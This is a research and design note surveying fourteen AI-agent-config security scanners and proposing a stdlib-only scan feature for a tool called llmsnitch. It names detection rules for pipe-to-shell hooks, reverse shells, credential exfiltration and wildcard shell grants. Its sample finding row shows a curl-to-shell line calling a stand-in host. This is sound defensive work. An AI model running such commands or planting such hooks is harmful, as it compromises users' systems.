# Scanner survey → llmsnitch scan MVP

> Convention note: this lives in `docs/research/` beside
> `unicode-evasion-redaction.md`, the established home for cited research
> notes — primary-source dossiers that feed later design changes. Same
> citation style: scanner paths are relative to
> `submodule/security-scanners/<scanner>/`; llmsnitch paths are repo-relative.

## TL;DR

The MVP is one new cold-path subcommand, `llmsnitch scan`: a stdlib-only
walker over a fixed seed inventory of agent-config artifacts (SKILL.md
bundles, `.claude/settings.json` + hooks, `.mcp.json` variants,
CLAUDE.md-class instruction files, skill scripts) running four checks —
`.claude/` compromise patterns, skill-manifest static checks, secret-shape
audit at rest, and SHA-256 drift fingerprinting — with ~30–40 regex rules
shipped **inline in code** (Ramparts' fail-open-with-zero-rules history is
the cautionary tale). Findings land as NDJSON in
`~/.llmsnitch/scans/<scan-id>/findings.ndjson` mirroring the existing
session store; reporting is `--format text|json|sarif` with the gate's
0/1/2 exit codes; only *new-fingerprint* findings route to the notifier as
`config_compromise` / `secret_at_rest` / `config_drift`; the dashboard is
the scan summary + the notifier digest/TUI pane — no HTML, no server.
Everything else (YARA, LLM judges, live MCP scanning, trust grades,
registries) is cut.

---

# Part 1 — Scanner survey (14, from primary sources)

| # | Scanner | Language | License | Core detection approach | Portable? |
|---|---|---|---|---|---|
| 1 | highflame-ai-ramparts | Rust | Apache-2.0 | YARA-X rules (40) + ~18 Rust heuristics over skills/MCP configs; NFKC/invisible normalization; SHA-256 drift baseline | partial |
| 2 | pantheon-security-medusa | Python | **AGPL-3.0** | Regex over YAML rule packs (207 files, 40 801 IDs); `.claude/` + MCP + instruction-file scanners; 21 secret patterns | partial (independent design only) |
| 3 | skilltrust-skill-detector | Go | MIT | 24 stdlib-regexp rules over agent files; 4-axis grade via worst-finding cap table | partial |
| 4 | cisco-ai-defense-skill-scanner | Python | Apache-2.0 | 45 signature + 18 YARA + 60 Python checks over SKILL.md bundles; SARIF 2.1.0 emitter | partial |
| 5 | snyk-agent-scan | Python | Apache-2.0 | Local discovery of 9 harnesses + 36-row well-known-path table; risk analysis is remote (Snyk API) | partial (discovery only) |
| 6 | mcpware-cross-code-organizer | Node ESM | MIT | 58-regex pattern scan + deobfuscation + hash baselines over `~/.claude` scopes; web dashboard | partial |
| 7 | huta0kj-vetix | Python | MIT | 10 heuristic plugins over SKILL.md dirs + LangGraph LLM audit; 10-category taxonomy | partial (taxonomy + plugins) |
| 8 | tanviet12-vbsec | none (skill pack) | MIT | 21 markdown rule files executed by the LLM; L1–L4 taint vocabulary | vocabulary only |
| 9 | anthropics-defending-code-reference-harness | Python | Apache-2.0 | Docker-sandboxed find/judge LLM agent pipeline for vuln hunting | doctrine only |
| 10 | agentsecops-secopsagentkit | none (skill pack) | dual (LICENSE.md) | 32 skills wrapping external tools (semgrep, zap, nuclei); 7-category taxonomy | taxonomy only |
| 11 | huifer-skill-security-scan | Python | MIT | ~10 regex rule classes over skill dirs; console/JSON/HTML reporters | no (redundant) |
| 12 | opena2a-org-ai-trust | TypeScript | Apache-2.0 | Registry-backed package adjudication (`api.oa2a.org`) + telemetry | no |
| 13 | openclaw-clawscan | Go | MIT | Composes 9 external scanners in Docker + LLM judge; one small built-in static scanner | no (one nugget, see Part 4) |
| 14 | tencent-ai-infra-guard | Go + Python | Apache-2.0 | Distributed platform: HTTP fingerprints, CVE db, LLM prompt-template rules | no |

## 1. highflame-ai-ramparts (Rust, Apache-2.0 — `Cargo.toml:11-15`)

- **Walkers**: skills walker collects `*.md`, descends dotdirs only in
  `{.claude,.cursor,.codex,.openai,.windsurf,.gemini}`, treats byte-exact
  `SKILL.md` as a bundle root with `scripts/`/`references/`/`assets/`
  siblings (`src/skills.rs:2246-2330`, `:101-122`, `:137-139`); MCP-config
  walker matches exact filenames `mcp.json`, `mcp_config.json`,
  `claude_desktop_config.json`, `settings.json`, `settings.local.json`,
  `managed-settings.json`, `*.mcp.json` (`src/config.rs:2359-2416`).
- **Engines**: 40 YARA rules in 15 files loaded from disk at runtime —
  **not embedded**; `Cargo.toml:19` excludes `rules/` from the published
  crate, and `src/scanner.rs:73-78` documents a past silent
  fail-open-with-zero-rules. Plus ~18 Rust heuristics
  (`OverbroadAllowedTools`, `SkillEmbeddedPayload`, `UndeclaredNetworkEgress`,
  … — `src/skills.rs`, 18 `make_heuristic_finding` sites).
- **Normalization**: strip invisibles then NFKC, rescan the canonical view
  (`src/normalize.rs:44-46,145-175`) — already ported by
  `docs/research/unicode-evasion-redaction.md`.
- **Drift**: `BaselineStore { map: HashMap<String,String> }` keyed
  `"{namespace}\x1f{key}" → sha256`, persisted to
  `~/.ramparts/content-baseline.json` — **no timestamp field**
  (`src/baseline.rs:27-43,61-71,90-100`); drift rules `MCPToolChanged` /
  `SkillContentChanged` (`src/baseline.rs:167,192`).
- **Emitters**: `json|table|text|raw|sarif` (`src/utils.rs:136-141`); SARIF
  2.1.0 assembled in `src/sarif.rs:18-20,36-110`; markdown report
  `src/utils.rs:2119-2566`. No HTML.
- **Offline**: YARA + heuristics + drift are local; LLM checks fail-soft
  when unconfigured (`src/security/mod.rs:321-323,380-383`); network only
  for optional LLM, OSV.dev (`src/osv.rs:28`), and live MCP JSON-RPC
  (`src/mcp_client.rs:773+`).

## 2. pantheon-security-medusa (Python, **AGPL-3.0** — `pyproject.toml:11`)

**License doctrine (repeated for emphasis): AGPL-3.0. This survey reads
MEDUSA source to characterize capabilities only. The llmsnitch
implementation must be an independent design from public documentation —
no code, no rule text, no schema copied. Where MEDUSA is the only source
for a pattern class, the MVP grounds the same class in the Apache/MIT
scanners instead (noted inline below).**

- **Inventory**: one `os.walk` classifier hits `.mcp.json`,
  `claude_desktop_config.json`, `.cursorrules` variants, `AGENTS.md`,
  `copilot-instructions.md`, all `*.md` under top-level `.claude`/`.github`/
  `.cursor` (`medusa/core/parallel.py:506-770`, names `:606-624`); dedicated
  `ClaudeCodeScanner` gates on `.claude/settings.json`,
  `settings.local.json`, `.claude/agents/*.md`, `.claude/skills/**/*.sh|*.py`
  (`medusa/scanners/claude_code_scanner.py:39,71-85`); 45-entry priority
  glob list names `SKILL.md`, `.claude/hooks/*`, `.claude/commands/*.md`,
  `.kiro/settings/mcp.json`, `.codex/config.toml` (`medusa/cli.py:1736-1779`).
- **`.claude/` compromise rules**: `rules/claude_code/hooks_exfiltration_2026.yaml`
  — hook-curl-pipe-to-shell, hook-base64-decode-to-shell,
  hook-credential-exfiltration, hook-exfil-to-collector, hook-reverse-shell
  (`:12,22,34,46,57`); allow-all permission literals
  (`claude_code_scanner.py:42`); wildcard-subagent `tools: *` (`:48-56`).
- **Secrets**: 21 patterns / 17 issuers in `medusa/core/secret_patterns.py:40-249`
  (Anthropic, OpenAI, HF, Replicate, Cohere, PyPI, npm, 4×GitHub, GitLab,
  AWS, GCP, 2×Stripe, Slack, SendGrid, Twilio, Discord webhook, PEM);
  generic shapes deliberately excluded (`:5-6`). Separate `medusa secrets`
  command sweeps agent chat histories (`medusa/core/chat_history_discovery.py:71-274`).
- **Emitters**: JSON/Markdown/HTML from `medusa/core/reporter.py:158-392,563-1152`;
  SARIF 2.1.0 exists (`:393-543`) but is **dead code from the CLI** —
  `--format` accepts only `json|html|markdown|all` (`medusa/cli.py:1291-1292`).
  HTML is one self-contained f-string: SVG donut score ring, severity grid,
  scanner table, finding cards — no JS charting, no CDN (`reporter.py:1054-1215`).
- **Offline**: no HTTP client or LLM SDK anywhere in `medusa/` (grep-verified);
  egress only user-initiated (`--git` clone, `medusa install`).

## 3. skilltrust-skill-detector (Go, MIT — `go.mod:1-3`, `LICENSE:1-3`)

- **Inventory**: walks hidden dirs `.claude .codex .opencode .cursor .gemini
  .windsurf .vscode .github` (`pkg/scanner/discover.go:23-32`); file-class
  gates: instruction files = CLAUDE.md/AGENTS.md/GEMINI.md/.cursorrules/
  .windsurfrules/copilot-instructions.md/`.cursor/rules/*.mdc`
  (`pkg/rules/fileclass.go:45-67`), `.claude/settings{,.local}.json`
  (`:80-87`), `.mcp.json` + `.claude|.cursor|.vscode/mcp.json` (`:91-111`).
  **No frontmatter parsing** — `SKILL.md` is a basename gate only (`:115-118`).
- **Rules**: 24 (`SD-001`–`SD-024`, `pkg/rules/registry.go:68-81`). Highlights:
  SD-009 curl-pipe-bash CRITICAL (`pkg/rules/supply_chain.go:13`); SD-002
  prompt-injection + invisible-unicode/bidi/Tag-block payloads
  (`pkg/rules/injection.go:19-36`); SD-017 broad shell grant `Bash(*)` /
  `Bash(curl*)` in settings permissions (`pkg/rules/settings_json.go:130-157`);
  SD-020 hook shell-metachar interpolation CRITICAL (`pkg/rules/hooks.go:53-58`);
  SD-006 secret shapes AKIA/`sk-`/`gh[pousr]_`/`xox`/generic
  (`pkg/rules/misconfiguration.go:18-24`). `bypassPermissions` is NOT
  detected (grep-verified).
- **Scoring**: no weights, no overall score — grade per axis =
  cap-table lookup on the single worst finding
  (`pkg/grade/grade.go:15-88`, `pkg/grade/templates.go:11-40`); the
  `quality` axis has **zero rules** (reserved slot, hidden in output,
  `pkg/reporter/text.go:114-122`). Ruleset SHA-256 checksum stamps results
  (`pkg/rules/registry.go:37-51`). `pkg/delta/` diffs two result JSONs
  (new vs resolved findings, `delta.go:12-78`).
- **Emitters**: text, JSON, quiet only — **no SARIF**
  (`cmd/skill-detector/main.go:184`).
- **Offline**: fully — no net/http, no subprocess (grep-verified); LLM
  triage seam ships an inert `NoopVerifier` (`pkg/triage/triage.go:55-75`).

## 4. cisco-ai-defense-skill-scanner (Python ≥3.10, Apache-2.0 — `pyproject.toml:13-14`)

- **Inventory**: recursive `SKILL.md` discovery (`skill_scanner/core/scanner.py:1009-1077`);
  frontmatter parse of name/description/`allowed-tools`/metadata
  (`core/loader.py:186-285`); bundle rglob with symlink/.git skip and size
  caps (`:287-345`; caps `data/default_policy.yaml:392-400`). Does **not**
  scan `.claude/settings.json`, hooks, or `.mcp.json` contents.
- **Rules**: default pack = 45 signature YAMLs + 18 YARA + 60 Python checks
  (105 registry entries); opt-in `atr` pack adds 712. Representative:
  `COMMAND_INJECTION_EVAL` (`skill_scanner/data/packs/core/signatures/command_injection.yaml:4`),
  `PROMPT_INJECTION_CONCEALMENT` "do not tell the user"
  (`prompt_injection.yaml:47-59`), `ALLOWED_TOOLS_BASH_VIOLATION` — code
  executes bash the frontmatter never declared
  (`core/analyzers/static.py:1550-1560`,
  `packs/core/python/allowed_tools_checks.py:117-218`).
- **Secrets**: 8 rules in `packs/core/signatures/hardcoded_secrets.yaml`
  (AWS `:4`, Stripe `:24`, Google `:33`, GitHub `:42`, JWT `:51`, private
  key `:60`, password var `:84`, connection string `:95`) with placeholder
  exclude-patterns; match redaction at `static.py:143-165`.
- **Emitters**: summary/json/markdown/table/**sarif**/html (`cli/cli.py:893`).
  **SARIF 2.1.0 is real and complete**: `core/reporters/sarif_reporter.py` —
  `SARIF_VERSION = "2.1.0"` + schema URI (`:35-36`), severity→level map
  CRITICAL/HIGH→error, MEDIUM→warning, LOW/INFO→note (`:39-46`), envelope
  (`:76-129`), `tool.driver.rules` (`:131-179`), results with
  `physicalLocation` + `%SRCROOT%` uriBaseId (`:211-246`),
  `fingerprints.primaryLocationLineHash` (`:250-253`).
- **Offline**: core static scan is offline (`core/analyzer_factory.py:65-80`);
  LLM/VirusTotal/AI-Defense/OSV are flag-gated (`:83-216`) — though LLM
  SDKs are hard install-time deps (`pyproject.toml:69-73`).

## 5. snyk-agent-scan (Python, Apache-2.0)

- **Discovery is the portable half.** Two phases: 9 per-agent discoverers
  (claude_code, claude_desktop, codex, opencode + vscode family: vscode,
  cursor, windsurf, kiro, antigravity — `src/agent_scan/agents/`) extending
  `AgentDiscoverer` (`agents/base.py:126-153`, 20 MiB config cap `:54`),
  plus a per-OS well-known-path table of **36 `CandidateClient` rows**
  (`src/agent_scan/well_known_clients.py:18` onward) — e.g. windsurf
  `~/.codeium/windsurf/mcp_config.json`, cursor `~/.cursor/mcp.json`,
  vscode `~/Library/Application Support/Code/User/mcp.json`, claude code
  `~/.claude.json` + `~/.claude/plugins/cache/**/.mcp.json` globs
  (`:19-56`). Claude Code discoverer covers global/project/plugin/managed
  scopes and `.claude/skills` + `.agents/skills`
  (`agents/claude_code.py:51-104`).
- **Models**: `CandidateClient` (`models/inspect.py:10-19`),
  `InspectedServer`/`InspectedSkill`/`InspectedPath` (`:38-72`).
- **Analysis is remote**: scan requests go to Snyk's API
  (`verify_api.py:12` aiohttp; API models `models/api/v20260710`); risk
  scores come back from the service (`printer.py:275` colors them).
- **Emitters**: rich terminal tree + `--json` (`cli.py:511-514`). No SARIF.

## 6. mcpware-cross-code-organizer / CCO (Node ESM, MIT)

- **Scan engine** `src/security-scanner.mjs`: header self-describes 4
  layers (`:1-10`). Layer 1 deobfuscation: zero-width strip (`:37-39`),
  Tag-block strip (`:44-47`), variation selectors, bidi, leetspeak
  normalization second pass (`:479-495`). Layer 2: **58 regex patterns**
  (`const PATTERNS`, `:156`; measured `grep -c "regex:"` = 58) in
  categories prompt_injection (PI-001…008, `:160-188`), tool_poisoning
  (TP-001…006, `:194-214`), tool_shadowing (TS-001…003, `:220-228`),
  sensitive_access (SF-001…005, `:234-250`), data_exfiltration (DE-001…,
  `:256-264`). Finding shape: pattern + sourceType/sourceName/matchedText/
  context (`:468-475`). Layer 3: SHA-256 tool-hash baselines in
  `~/.claude/.cco-security/baselines.json` returning
  changed/added/removed/unchanged (`:20-23,560+`). Layer 4: LLM judge via
  `claude -p`, user-triggered (`:1-10`, imported `src/server.mjs:22`).
- **What it scans**: `~/.claude/projects/` scope discovery
  (`src/scanner.mjs:361-378`), skills global/managed/per-repo (`:541-548`),
  MCP configs `~/.claude/.mcp.json` + `~/.claude.json` mcpServers +
  project `.mcp.json` (`:676-713`), `settings.json`/`settings.local.json`
  (`:789,904-905`), `CLAUDE.md` (`:865`), rules/commands/agents dirs
  (`:1144,1192,1232`). Harness adapters: only **two** exist — claude and
  codex (`src/harness/adapters/`; codex sources listed
  `codex.mjs:67-173`).
- **Dashboard**: a real local web app — `node:http` `createServer`
  (`src/server.mjs:7`) serving `src/ui/` (SPA: sidebar scope tree, security
  scan button + badge (`src/ui/index.html:25-28`), item list, detail panel
  with per-session cost breakdown (`:76-82`), context-budget and MCP
  controls (`:50-51`)).
- **Offline**: pattern scan + baselines are local; LLM judge shells out to
  `claude`; backup/export features touch network elsewhere.

## 7. huta0kj-vetix (Python, MIT — `LICENSE:1-3`)

- **Scans SKILL.md directories** (`vetix/cli.py:52-54` requires `SKILL.md`).
- **Taxonomy**: `RiskCategory` Literal of exactly 10 —
  Remote Execution, Data Exfiltration, Persistence, Destructive,
  Obfuscation, Command Injection, Privilege Escalation, Sensitive File
  Access, Network Abuse, Prompt Injection (`vetix/plugin.py:21-32`);
  `Severity` 5-level (`:13-18`); `Issue` dataclass with `audit_required`
  flag (`:34-44`).
- **10 heuristic plugins** (offline regex/stat checks, `vetix/plugins/`):
  reverse_shell (`plugins/reverse_shell.py:12-14`), base64_exec,
  binary_file, public_ip, rare/exceptional/large/long file,
  consecutive_newlines, low_python_code_density.
- **LLM audit layer**: LangGraph nodes (`vetix/audit/nodes/`) over
  `langchain_openai` (`vetix/llm.py:3`) — network-dependent; JSON report
  saved per skill hash (`cli.py:30`).

## 8. tanviet12-vbsec (skill pack, MIT — `LICENSE:1-3`)

- **No code** — the repo is `skills/vbs-scan-security/` (SKILL.md, 21
  generic rule markdowns `rules/generic/01-…21-*.md`, workflows, references)
  executed by Claude Code itself; installers are shell scripts (`scripts/`).
- **L1–L4 trust levels**: defined in
  `skills/vbs-scan-security/references/data-flow-classification.md:1-14`
  (L1 user-controlled/untrusted, L2 DB/semi-trusted, … with per-framework
  notes). It is a *taint* vocabulary for the LLM reviewer, not a runtime
  structure.
- **Report contract**: `references/output-format.md:6-17` — verdict
  PASS/WARN/FAIL, severity sections, trailing fenced-JSON summary for
  machine consumption.

## 9. anthropics-defending-code-reference-harness (Python, Apache-2.0 — SPDX `harness/find.py:1-2`)

- A Docker-sandboxed **LLM agent pipeline**, not a scanner: find loop
  (max 2000 turns, `harness/find.py:3-19`), judge/compare stages — "LLM
  triage instead of regex signature match" (`harness/judge.py:3-8`,
  verdicts NEW/DUP_BETTER/DUP_SKIP `:22`).
- Artifacts are dataclasses (`harness/artifacts.py:15-150`); skills
  triage/verify/vuln-scan/threat-model/dnr-* under `.claude/skills/`;
  escalation doctrine in `docs/triage.md`, `docs/detection-response.md`.
- Nothing here runs without Claude + Docker. Doctrine-only for llmsnitch,
  as PORT_INDEX says.

## 10. agentsecops-secopsagentkit (skill pack, dual license — `LICENSE.md:1-3`)

- 32 `SKILL.md` skills (measured) wrapping external tools (semgrep, bandit,
  zap, nuclei, spectral, blackduck — `skills/appsec/` dir names). Only
  code is a frontmatter validator (`scripts/validate_skill.py`) and a
  marketplace generator.
- **Taxonomy**: `VALID_CATEGORIES` = appsec, devsecops, secsdlc,
  threatmodel, compliance, incident-response, offsec
  (`scripts/validate_skill.py:27-35`) — **seven**, not the five PORT_INDEX
  lists (see Part 4).

## 11. huifer-skill-security-scan (Python, MIT — `LICENSE:1-3`)

- ~10 rule classes across 5 modules (`src/rules/{command,injection,fileops,
  network,dependencies}.py`, 2 each) — line-loop regexes like `sudo`,
  `rm -rf /` with hand-set confidences (`src/rules/command.py:26-40`);
  scans skill dirs via a SkillParser (`src/scanner/detector.py:27-54`).
- Reporters: console, JSON, HTML — the HTML reporter defaults to loading
  assets from a CDN (`src/reporters/html_report.py:12`, `use_cdn: bool = True`).
- Verified redundant: every rule is a strict subset of skill-detector/
  Cisco/CCO coverage. PORT_INDEX rejection stands.

## 12. opena2a-org-ai-trust (TypeScript, Apache-2.0 — `package.json`)

- Registry-adjudication model confirmed: default registry
  `https://api.oa2a.org` (`src/index.ts:31`), `--registry-url` threaded
  through every command (`src/commands/check.ts:93-187`), contribution
  telemetry POSTs (`src/telemetry/contribute.ts:170,200`).
- The only local logic is verdict *messaging* — the score-aware
  `safe|warning|blocked` enum (`src/output/score-aware-verdict.ts:1-40`) —
  which still takes the registry score as input; the local scan itself is
  the external `hackmyagent` npm dep. Rejection stands.

## 13. openclaw-clawscan (Go, MIT — `LICENSE:1-3`)

- Rejection verified: it registers **nine** scanners — agentverus, aig,
  cisco, clawscan-static, relyable, skillspector, snyk, socket, virustotal
  (`schemas/clawscan.schema.json:71-83`) — run in a Docker sandbox
  (`internal/runner/sandbox.go:14,45-73`), with an LLM judge profile
  emitting `benign|suspicious|malicious` + 5 dimensions
  (`internal/profiles/clawhub/output.schema.json:14-27`,
  `prompt.md`). llmsnitch does not run scanners; nothing to port there.
- **One portable nugget the wholesale rejection missed**:
  `internal/runner/static_scanner.go` (429 lines) is a fully self-contained
  regex scanner: 8 rules (`static.prompt_injection`,
  `static.credential_exfiltration`, `static.pipe_to_shell`,
  `static.destructive_shell`, `static.python_process_execution`,
  `static.python_bytecode`, `static.nul_byte_in_text`,
  `static.opaque_binary` — `:74-121`), a normalized `staticFinding`
  {id,title,severity,description,path,line,evidence} (`:54-62`), evidence
  capped at 180 bytes (`:17`), and per-file SHA-256 inventory (`:48-52`).
  The *disciplines* (evidence cap, per-file hash in scan output) are worth
  adopting; MIT license, tiny surface.

## 14. tencent-ai-infra-guard (Go + Python, Apache-2.0)

- Rejection verified: a distributed platform (frontend/, docker-compose,
  server + agent runtime dirs). Its data packs are not portable rule sets:
  `data/mcp/*.yaml` are **LLM `prompt_template` rules** (e.g.
  `data/mcp/mcp_credential_exfiltration.yaml:9` — a source-AND-sink prompt
  for an analyst model, not a regex); `data/fingerprints/` is 145
  nuclei-style **HTTP fingerprint** YAMLs for remote web services
  (`data/fingerprints/9router.yaml:11-16` — method/path/body matchers);
  `data/vuln/` is 117 CVE entries for those web products. All three
  require network or an LLM by construction. Nothing survives the
  stdlib-only/no-network bar.

---

# Part 2 — MVP proposal

Design constraints inherited unchanged: stdlib-only Python 3.9+, no
network (`README.md:15-23`), flat files 0600/0700 (`llmsnitch/store.py:1-6`),
redact before disk (`llmsnitch/hook.py:5-8`), gate exit codes 0/1/2
(`llmsnitch/gate.py:18`), every alert passes Decision/Actor/Novelty
(`AGENTS.md`). The scan is **cold-path only** — it never runs inside the
hook handler; the hot-path budget is untouched.

## 2.1 Types of scans (five in, ranked)

**One engine note before the list**: rules ship **inline in
`llmsnitch/scanrules.py`**, not as data files. Ramparts loads rules from a
runtime-resolved directory, excludes them from its published crate
(`Cargo.toml:19`), and carries a comment documenting the resulting silent
fail-open-with-zero-rules (`src/scanner.rs:73-78`). skill-detector does the
opposite — rules are Go code with a SHA-256 ruleset checksum stamped into
every result (`pkg/rules/registry.go:37-51`). We follow skill-detector.

1. **Discovery walk** — enumerate agent-config artifacts under a fixed
   seed table (below) before checking anything. Sources: snyk's 36-row
   `CandidateClient` table + 9 discoverers
   (`well_known_clients.py:18+`, `agents/claude_code.py:51-104`),
   Ramparts' dotdir-gated skills walker (`src/skills.rs:2319-2324`),
   skill-detector's hidden-dir list (`pkg/scanner/discover.go:23-32`).
   Stdlib bar: `os.walk` + `fnmatch` + a depth cap (Ramparts caps at 16;
   skill-detector NUL-sniffs binaries, `discover.go:280-291` — we do both).
   Standalone value: `llmsnitch scan --inventory` prints what exists —
   the fs-coil enrolment seed PORT_INDEX wanted from CCO.
2. **`.claude/` compromise checks** — the highest-value detection class:
   hook command strings matching curl/wget-pipe-shell, base64-decode-pipe-
   shell, reverse-shell shapes; settings `permissions.allow` containing
   `Bash(*)`-class wildcard grants; `defaultMode`/`bypassPermissions`
   literals. Sources: skill-detector SD-017 `isBroadShellGrant`
   (`pkg/rules/settings_json.go:130-157`) and SD-020 hook interpolation
   (`pkg/rules/hooks.go:53-58`), CCO SF/DE patterns
   (`src/security-scanner.mjs:234-264`), clawscan's pipe-to-shell/
   destructive-shell rules (`internal/runner/static_scanner.go:88-101`).
   MEDUSA's `hooks_exfiltration_2026.yaml` corroborates the class
   (capability citation only — AGPL; the shapes above are all available
   from the MIT/Apache sources). Note: `bypassPermissions` detection
   exists in **no** surveyed scanner (skill-detector grep-verified
   negative) — we add it; it's one literal.
3. **Skill-manifest static checks** — SKILL.md frontmatter + body + bundled
   scripts: instruction-override phrasing, concealment directives ("do not
   tell the user"), invisible-unicode/bidi/Tag-block payloads, base64
   blobs, reverse shells, undeclared-capability mismatch (script runs bash,
   frontmatter's `allowed-tools` doesn't declare it). Sources: Cisco
   signatures (`packs/core/signatures/prompt_injection.yaml:47-59`,
   `command_injection.yaml:4-147`) and `allowed_tools_checks.py:117-218`;
   skill-detector SD-002/SD-008/SD-009 (`injection.go:19-36`,
   `exfiltration.go:137-142`, `supply_chain.go:13`); Ramparts heuristics
   (`SkillEmbeddedPayload`, `UndeclaredNetworkEgress` — `skills.rs`);
   vetix plugins (`plugins/reverse_shell.py:12-14`). All pure regex +
   `str` ops; frontmatter parsing is a ~30-line hand parser (key: value
   lines between `---` fences — Cisco uses python-frontmatter, we don't
   need YAML for the four keys we read).
4. **Secret-shape audit at rest** — run the existing `_SECRET` set
   (`llmsnitch/hook.py:22-31`) plus a small issuer extension (GCP `AIza`,
   Stripe `sk_live_/rk_live_`, GitLab `glpat-`, npm `npm_`, HF `hf_`)
   over discovered artifacts, after the `_canonical` NFKC fold from
   `docs/research/unicode-evasion-redaction.md`. Non-AGPL grounding for
   the shapes: Cisco `hardcoded_secrets.yaml:4-95` and skill-detector
   `misconfiguration.go:18-24` (MEDUSA's 21-pattern set is corroboration
   only). Findings report *pattern name + location*, never the matched
   value — evidence passes `hook._clean` before disk.
5. **Drift fingerprinting** — SHA-256 each discovered artifact into
   `~/.llmsnitch/baseline.json` (flat `{"<class><path>": {"sha256": …,
   "first_seen_ts": …}}`); subsequent scans emit `config_drift` findings
   for changed/added/removed. Model: Ramparts `BaselineStore`
   (`src/baseline.rs:27-43,61-71`) — noting its store has **no timestamp**;
   we add `first_seen_ts` as a declared deviation because novelty math
   needs it. CCO's changed/added/removed/unchanged split
   (`security-scanner.mjs:560+`) is the diff vocabulary. `llmsnitch scan
   --rebaseline` is the explicit re-approve action.

All five are pure stdlib (`os`, `re`, `hashlib`, `json`, `unicodedata`)
and read-only over the filesystem — no subprocess, no network, trivially
inside the no-network test grep.

## 2.2 Types of artifacts scanned

| Artifact class | Concrete paths (seed table) | Scanned today by (source) |
|---|---|---|
| Skill manifests + bundles | `~/.claude/skills/**/SKILL.md` + project `.claude/skills`, `.agents/skills`; bundle siblings `scripts/`, `references/`, `assets/` | Cisco (`core/scanner.py:1009-1077`, `core/loader.py:186-345`); Ramparts (`src/skills.rs:101-139,2342-2401`); snyk (`agents/claude_code.py:56-60`); vetix (`vetix/cli.py:52-54`) |
| Plugins (walked sub, D10) | `~/.claude/plugins/marketplaces/*` and `~/.claude/plugins/cache/*/*/*` — each plugin root walked with `_MAX_DEPTH` measured from the root, not from `~/.claude` (plugin skills sit at depth 8); marketplaces before cache, symlinked or junk-nested roots skipped | — (wayfinder/quiet-patrol D10; no surveyed scanner walks plugin trees) |
| Claude settings | `~/.claude/settings.json`, `settings.local.json`, project `.claude/settings{,.local}.json`, `managed-settings.json` | skill-detector (`pkg/rules/fileclass.go:80-87`); MEDUSA (`claude_code_scanner.py:39`); CCO (`src/scanner.mjs:789,904-905`); Ramparts config walker (`src/config.rs:2359-2366`) |
| Hooks | hooks blocks inside settings JSON + `.claude/hooks/*` scripts | skill-detector SD-020 (`pkg/rules/hooks.go:53-58`); MEDUSA priority list (`cli.py:1736-1779`) |
| MCP configs | `.mcp.json`, `~/.claude.json` (mcpServers), `~/.claude/plugins/cache/**/.mcp.json`, `.cursor/.vscode/.gemini/.codeium mcp.json` variants, `claude_desktop_config.json` | skill-detector (`fileclass.go:91-111`); Ramparts (`config.rs:2359-2416`); snyk (`well_known_clients.py:19-56`); CCO (`scanner.mjs:676-713`); MEDUSA (`parallel.py:606-616`) |
| Agent-instruction files | `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, `.cursorrules`, `.windsurfrules`, `.github/copilot-instructions.md`, `.cursor/rules/*.mdc` | skill-detector (`fileclass.go:45-67`); MEDUSA AIContextScanner (`ai_context_scanner.py:7-8,99,853`) |
| Skill/hook scripts | `.py .js .ts .rb .ps1 .sh` + extensionless hook scripts inside agent dirs | skill-detector (`discover.go:61-66`); MEDUSA (`claude_code_scanner.py:71-85`); Cisco script analyzer (`static.py:295-347`) |
| Chat transcripts / session ledgers | `~/.claude/history.jsonl`, `~/.claude/projects/**` | MEDUSA `medusa secrets` only (`chat_history_discovery.py:71-274`) — **cut from MVP**: llmsnitch already redacts its own trail at capture time (`hook.py:5-8`), and sweeping other tools' histories is a different product (phase 2 candidate) |

MVP scope rule: the seed table ships in code with exactly the agent
territories the notifier spec's agent registry already names
(`docs/notifier-spec.md` §Agent registry: `~/.claude`, `~/.codex`,
`~/.aider`, `~/.copilot`, `~/.cursor`, `~/.windsurf`, `~/.agy`) plus the
current project directory. The full 36-row per-OS snyk table is the
documented expansion path, not MVP.

## 2.3 Recording scan results

**What the scanners do:** Cisco — plain dataclass `Finding` {id, rule_id,
category, severity, title, description, file_path, line_number, snippet,
remediation, analyzer, metadata} (`core/models.py:172-204`); skill-detector
— `Finding` with `SchemaVersion "1.4"`, severity + effective severity,
confidence, axis (`pkg/model/model.go:114-128,167`); Ramparts —
`YaraScanResult` with free-form severity strings (`src/types.rs:35-74`);
MEDUSA — `ScannerIssue` + SHA-256 fingerprint of `rule_id:file:line:issue`
used only in its SARIF `partialFingerprints` (`scanners/base.py:49-74`,
`core/reporter.py:468-499`); clawscan — `staticFinding` with a 180-byte
evidence cap and per-file SHA-256 inventory
(`internal/runner/static_scanner.go:17,48-62`).

**Proposal — findings are a cold trail, stored exactly like sessions:**

```
~/.llmsnitch/scans/<scan-id>/findings.ndjson   # one finding per line
~/.llmsnitch/scans/<scan-id>/meta.json         # scan-level summary
```

Same primitives as `llmsnitch/store.py`: `_mkdir_private` 0700 dirs,
0600 files, append-only NDJSON, readers tolerate a truncated tail
(`store.py:14-47,64-77`). `<scan-id>` = `scan-YYYYMMDD-HHMMSS`.

Finding row (fixed key order, epoch floats, optional keys omitted — the
same conventions as the notifier ledger row schema in
`docs/notifier-spec.md` §Event ledger):

```json
{"v": 1,
 "ts": 1755640000.1,
 "scan_id": "scan-20260820-090000",
 "rule_id": "hook_curl_pipe_shell",
 "category": "config_compromise",
 "severity": "critical",
 "artifact": "~/.claude/settings.json",
 "artifact_class": "claude_settings",
 "agent": "claude-code",
 "line": 14,
 "evidence": "curl -s http://col.example | sh",
 "sha256": "…file hash…",
 "fingerprint": "…sha256(rule_id|artifact|line|evidence)…"}
```

- `evidence` is passed through `hook._clean` (so `_SECRET` redaction
  applies — a secret-at-rest finding never re-leaks the secret it found)
  and capped at 180 chars (clawscan's discipline,
  `static_scanner.go:17`).
- `fingerprint` is the novelty/diff key — MEDUSA's SARIF fingerprint idea
  (`reporter.py:468-470`) promoted to a first-class field, because both
  the notifier routing (§2.5) and any future delta view key on it.
- `agent` is the registry territory bucket the artifact sits in (the
  notifier spec's Actor-bucket vocabulary; `unknown` outside any
  territory).

`meta.json`: `{scan_id, started_at, ended_at, roots, files_scanned,
files_skipped, findings_by_severity, ruleset_sha256}` — the ruleset
checksum copies skill-detector's reproducibility stamp
(`pkg/rules/registry.go:37-51`).

## 2.4 Reporting on results

**What the scanners implement:** Ramparts `json|table|text|raw|sarif` +
markdown (`src/utils.rs:136-141,2119-2566`); Cisco six formats incl. SARIF
and HTML (`cli/cli.py:893`); skill-detector text/JSON/quiet only
(`main.go:184`); MEDUSA JSON/Markdown/HTML with SARIF dead from the CLI
(`cli.py:1291-1292`); snyk rich tree + `--json` (`cli.py:511-514`).

